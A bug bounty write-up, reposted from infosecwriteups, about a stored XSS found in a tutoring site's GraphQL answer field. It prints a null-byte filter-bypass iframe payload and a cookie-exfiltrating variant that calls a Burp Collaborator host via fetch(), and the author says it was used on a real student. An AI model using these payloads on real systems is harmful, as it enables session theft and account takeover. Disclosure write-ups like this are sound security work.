# :globe_with_meridians: Pwning your assignments: Stored XSS via GraphQL endpoint

> **Original Source:** [Pwning your assignments: Stored XSS via GraphQL endpoint](https://infosecwriteups.com/pwning-your-assignments-stored-xss-via-graphql-endpoint-6dd36c8a19d5)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# Pwning your assignments: Stored XSS via GraphQL endpoint


## Background


The bug was found on a highly mature bug bounty program, that was running for over 4–5 years as a public/private program across various crowd-sourced platforms. Due to the fact, the program is discontinued and the bug was reported 5 months ago, I decided to share this bug with the community:)
So let’s begin!


At the time I started looking into the program, it had 700+ bugs reported and therefore due to the maturity of the program had bonuses applied to it. I spent 2–3 days looking at the target and found nothing. After a week or so, I had a discussion with a random college friend and he told me about earning money through a platform by helping young students. Surprisingly, it was the same company I was after. The tutoring feature he talked about was not directly accessible.


Looking into that specific functionality I found the following:


- It required an account registration.

- Pass a test on the subject I look forward to helping students with.

- Submit a govt. ID proof.

- Wait 2 weeks for the verification.


I thought it was quite hard to access this functionality. Therefore, a lot of people would have probably not reached so deep into the application. I applied for Computer Science tutoring, passed the test, and now I had the option to help students with their homework!


The bug types I decided to check here were: CSRF, IDOR and XSS. CSRF failed pretty quickly due to a large number of checks present on each and every request. Further IDOR wasn’t looking practical to me with UUIDv4’s being used properly.

## Here comes the XSS!


While answering the doubts, I found that “,> were allowed, however keywords like script, iframe, alert etc were sanitized from the answer. Going through the [Web Hacker’s Handbook](https://www.amazon.in/Web-Application-Hackers-Handbook-Exploiting-ebook/dp/B005LVQA9S), I found that adding a *%00 (null byte)* before “*>”* did not sanitize the keyword. Therefore I created the following payload:


```
<iframe %00 src=\"javascript:prompt(1)\"%00>
```


- *%00* to bypass the blacklist

- *\”* to pass double quotes inside a GraphQL input field


The above payload was reflected as follows:

*Reflection in the source code*


And I got the prompt with cookies!


*XSS prompt!*


I quickly reported the bug, but the triager considered it as a self-stored XSS and asked me to demonstrate impact.


## Get Kartik Sharma’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Attack Scenario/ Final Exploit
A student asks a doubt, the instructor submits the answer with a blind XSS payload. As soon as the student checks the answer, his cookies are passed on to the instructor. Therefore every time the instructor helps a student, he/she can take over the student’s account!


Payload:


```
<iframe %00 src= javascript:fetch(\"//XXXXXXXXXXXXXXXXXXXXXXXXXXXXX.burpcollaborator.net/?param=\"+document.cookie) %00>
```


- *fetch()* allows to make network requests similar to XMLHttpRequest (XHR)

- */?param=* added to avoid making it part of the domain


I quickly answered a student’s question and added the above payload at the end of the solution. Within 5 minutes, the student checked the answer and voila, I had the student’s cookies!


*student cookies fetched*


After making changes to the previous report, it was finally accepted as a valid finding.

*The reward:)*

## Takeaways


Stay curious and always look deep into the application. The functionalities that are harder to access are often missed by other hackers.

---

*Originally published on [Medium](https://infosecwriteups.com/pwning-your-assignments-stored-xss-via-graphql-endpoint-6dd36c8a19d5). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
